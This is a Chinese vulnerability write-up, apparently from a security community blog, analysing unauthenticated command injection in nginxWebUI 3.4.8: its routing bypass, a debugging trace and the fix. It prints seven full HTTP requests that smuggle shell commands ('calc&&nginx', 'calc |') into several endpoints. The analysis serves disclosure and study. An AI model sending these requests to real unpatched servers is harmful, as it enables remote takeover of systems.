#  nginxWebUI runCmd 未授权远程代码执行   
GoTTY  火线Zone   2023-07-07 17:40  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYNqK6RSBWBZHqxVR8BtfN9ngLBSQ7EX8Kibwfrba2oS92wdD3soW7ADg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqY2F4tIhG6W4F0FMkcK9FbxgCjZmIjvPDxEibSzrVY5uSKwfEHun5Tkqg/640?wx_fmt=png "")  
  
**01**  
  
**漏洞简介**  
  
  
之前对 nginxWebUI 进行过搭建和审计，但是当时仅仅关注到了后台的一些命令执行漏洞，最近爆出了未授权远程代码执行，再一次进行搭建环境和分析。  
  
  
**02**  
  
**环境搭建**  
  
```
https://github.com/cym1102/nginxWebUI/releases/download/3.4.8/nginxWebUI-3.4.8.jar
java -jar -Dfile.encoding=UTF-8 D:/home/nginxWebUI/nginxWebUI-3.4.8.jar --server.port=8080 --project.home=D:/home/nginxWebUI/
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYSDWoxSwFLic9PicrA4icIibZ7IpG89IK9J5KcicEaKJxtrcTy5I1NgGXRrQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYOPMtwxmsPEg5ejAVh7PDh2oOnfHariadZCh1ZNKYDTQgoG7qotiaKSXw/640?wx_fmt=png "")  
  
‍  
  
**03**  
  
**漏洞复现**  
  
  
我们利用网上公开的payload 进行测试  
```
http://127.0.0.1:8080/AdminPage/conf/runCmd?cmd=calc%26%26nginx
```  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYyag9bv6roxp1WGc4ZpzHBRjn7qoMcpURc3UmaI45rFueLMIZ54icHuA/640?wx_fmt=png "")  
  
‍  
  
**04**  
  
**漏洞分析**  
  
  
Solon 路由器对 url 的匹配默认是 “忽略大小写” 的  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYiam7ZAZoV268cDdYrerwtvAKuEiaffalJ8Skepls9IxnZq7FvshS5jDQ/640?wx_fmt=png "")  
  
‍  
  
**05**  
  
**调试分析**  
  
```
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005  -jar -Dfile.encoding=UTF-8 D:/home/nginxWebUI/nginxWebUI-3.4.8.jar --server.port=8080 --project.home=D:/home/nginxWebUI/
```  
  
  
com.cym.config.AppFilter#doFilter  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYARU7sxYVLmaYQfG0yVgb0SVVjfkEEutJ9u39uETFic2xITJLsL4pE4A/640?wx_fmt=png "")  
  
  
传入的路由与设置的匹配条件均不满足，继续进行匹配  
  
  
org.noear.solon.core.route.RoutingTableDefault#matchOne  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYnSKa7o7diaynUeO6zMDfZfic8UreaPW7JVOaKZ3tsRicULxib4MiafaE2EA/640?wx_fmt=png "")  
  
‍  
  
在 solon 中将传入的路径与系统中路径依次进行匹配比较，因为大小写的不敏感，所以会匹配成功  
  
‍  
  
com.cym.controller.adminPage.ConfController#runCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYtjbibYiaQ8u3HiaOoz8bhKvDq7YGOhD6ZC1a3WicljsFzIITWxLaqlkVWg/640?wx_fmt=png "")  
  
  
当到达函数 runCmd 时 cmd 参数可控，进行了一部分校验和过滤 只有cmd 中存在字符串 nginx 才可以继续执行，利用 && 来实现命令的拼接  
  
  
cn.hutool.core.util.RuntimeUtil#exec(String...)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYu5e0tiaibxX6bRsWaNOgeC3NWjZGWiakHDwIcxK8cq0j1wGRnNdt2Otxg/640?wx_fmt=png "")  
  
‍  
  
**06**  
  
**漏洞修复**  
  
  
我们看到对漏洞针对性的修复操作是，将路由全部转换为小写再进行匹配校验  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYJjic379EaRhiaGk5aicoorWSWrWhRQ6PRPxHBGCnSX25mLicapdwdmMvtQ/640?wx_fmt=png "")  
  
  
感觉没有官方提供的修复方式更简便些  
  
  
结合目前未授权的情况，以及之前分析到的后台 RCE ，在这里做一个汇总，并进行一个比较简单的分析  
  
  
**「命令执行一」**  
  
****  
```
GET /AdminPage/conf/runCmd?cmd=calc%26%26nginx HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYBh3yXJyPhHdTCjb7pkmn4xLlbQL7a6MPAVYddEvp0Oaw6eBQDpJIgQ/640?wx_fmt=png "")  
  
‍  
  
com.cym.controller.adminPage.ConfController#runCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYgqYiaMIrxkvH9KlRkiaHuZtTq6HhH7xFKFl9wYv3V7aIZJAstZ643W5g/640?wx_fmt=png "")  
  
  
当到达函数 runCmd 时 cmd 参数可控，进行了一部分校验和过滤 只有cmd 中存在字符串 nginx 才可以继续执行，利用 && 来实现命令的拼接  
  
‍  
  
**「命令执行二」**  
  
‍  
```
POST /AdminPage/remote/cmdOver HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

remoteId=local&cmd=start calc%26%26nginx&interval=1
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYeLXfTG9D6JLbonYGDTdVXIEjCjZKVfXnyPE9cC005RcbELqczPMyog/640?wx_fmt=png "")  
  
  
com.cym.controller.adminPage.RemoteController#cmdOver  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYuCTcwBJtCBBxiaywG4LjbppR7XUpY5SknwaXY0caJHgmkibFGibT32Ucg/640?wx_fmt=png "")  
  
当满足传入的参数所对应的值时，最终会调用   
com.cym.controller.adminPage.ConfController#runCmd  
  
  
com.cym.controller.adminPage.ConfController#runCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYgqYiaMIrxkvH9KlRkiaHuZtTq6HhH7xFKFl9wYv3V7aIZJAstZ643W5g/640?wx_fmt=png "")  
  
  
当到达函数 runCmd 时 cmd 参数可控，进行了一部分校验和过滤 只有cmd 中存在字符串 nginx 才可以继续执行，利用 && 来实现命令的拼接  
  
  
**「命令执行三」**  
  
‍  
```
POST /Api/nginx/runNginxCmd HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

cmd=calc%26%26nginx
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYup8EXGVykEAibyw2K5sfIN0GxJ60684CpWgYyEJYatYbkvkxg3YMichw/640?wx_fmt=png "")  
  
  
com.cym.controller.api.NginxApiController#runNginxCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYddXVQ7thbwP3wPibOt8cicmosmIibfLJ5DtSTxwWo0cbABdjHrHQDwvDQ/640?wx_fmt=png "")  
  
  
com.cym.controller.adminPage.ConfController#runCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYgqYiaMIrxkvH9KlRkiaHuZtTq6HhH7xFKFl9wYv3V7aIZJAstZ643W5g/640?wx_fmt=png "")  
  
  
当到达函数 runCmd 时 cmd 参数可控，进行了一部分校验和过滤 只有cmd 中存在字符串 nginx 才可以继续执行，利用 && 来实现命令的拼接  
  
‍  
  
**「命令执行四」**  
  
‍  
```
GET /AdminPage/conf/reload?nginxExe=calc%20%7C HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqY5ylBjelrTCibiaUYFg5XqrF7GVrB1Itn2dZlRno1C7HBrlWrlW6TYVug/640?wx_fmt=png "")  
  
  
com.cym.controller.adminPage.ConfController#reload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYAu2QnvHAH684zt89n7LMsibsTwVffEOWdsyamu8Nh8WWeZ8bMAuCrjA/640?wx_fmt=png "")  
  
‍  
  
**「命令执行五」**  
  
```
POST /AdminPage/conf/check HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 91

nginxExe=calc%20%7C&json={"nginxContent":"","subContent":"[]","subName":"[]"}&nginxPath=/1/
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqY6eK4HwJsxiaElI6rDbl22wQ82DFgh3D0BVIqqCqXFg3bXjgk0uykTxw/640?wx_fmt=png "")  
  
  
com.cym.controller.adminPage.ConfController#check  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYnI0R2VAntgeeOtZ1VgkfGYqxHduBtG8CVl0Hr6V7oBmP78EK9Vl5Bg/640?wx_fmt=png "")  
  
  
要满足很多条件才可以触发  
  
  
**「命令执行六」**  
  
‍  
```
POST /AdminPage/conf/saveCmd HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

nginxExe=calc%20%7C&nginxPath=/&nginxDir=/
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYBCVyleLXQ9l580nR3HszvC4ThFIm4Jc0WA09CVDEaEIrc7CpL3FJgg/640?wx_fmt=png "")  
  
  
com.cym.controller.adminPage.ConfController#saveCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYyIrIazcdB6JB7a8kOxOz6U7lLiaxMUUGMrcwwJtickzF0FtQcDbBticpg/640?wx_fmt=png "")  
  
  
将参数设置为配置信息  
  
```
GET /AdminPage/conf/checkBase HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYNaJVzQicz7GmuIY2LULciaM42FIfdiajamC9HNW4fbzPyBOIrCk6zxrJA/640?wx_fmt=png "")  
  
  
从配置信息中读取并加载，执行命令  
  
  
com.cym.controller.adminPage.ConfController#checkBase  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYDMiczzJU251jQq4LaoKQCFMzgoFjmUczXhkzPiccWvsgCozF1eTs9HxQ/640?wx_fmt=png "")  
  
‍  
  
**「命令执行七」**  
  
```
POST /AdminPage/conf/saveCmd HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

nginxExe=calc%20%7C&nginxPath=/&nginxDir=/
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYBCVyleLXQ9l580nR3HszvC4ThFIm4Jc0WA09CVDEaEIrc7CpL3FJgg/640?wx_fmt=png "")  
  
‍  
  
```
GET /Api/nginx/check HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYPviaKMqN7yEjbYQVpvicynqPYpgsRJ5KrD1IeLic1MZkxiaddEyn9Ymrtw/640?wx_fmt=png "")  
  
  
  
往期推荐  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247498492&idx=1&sn=e9a8d1541c8e7837f9d792cb9edae99d&chksm=eaa972dcdddefbcac292efb3aa2d9eada1bf419ee3860d0a482a9d94de1ec57f4aa6003ef1b1&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247498451&idx=1&sn=802bf79f9b6a84f6b383001e0dbc6bee&chksm=eaa972f3dddefbe52e2ef19704549322769673526b5019ab76c52fc31d4d553dcb76251d38df&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247498416&idx=1&sn=d0f54fd6648bf7b8217512d81481f009&chksm=eaa97290dddefb866140fd52b11e9ddd3d52f009a120887c673c2fb3b135c8db44119e08afea&scene=21#wechat_redirect)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTJ8xicU3Uqq4NfhNWa7PYqYuastXK4Hiciatn4jiaWcicicEM2LA97MmicnH9GrEibNHAxocXG39EIlAibLAg/640?wx_fmt=png "")  
  
火线Zone是火线安全平台运营的安全社区，拥有超过20,000名可信白帽安全专家，内容涵盖渗透测试、红蓝对抗、漏洞分析、代码审计、漏洞复现等热门主题，旨在研究讨论实战攻防技术，助力社区安全专家技术成长，2年内已贡献1300+原创攻防内容，提交了100,000+原创安全漏洞。  
  
欢迎具备分享和探索精神的你加入火线Zone社区，一起分享技术干货，共建一个有技术氛围的优质安全社区！  
  
  
  
  
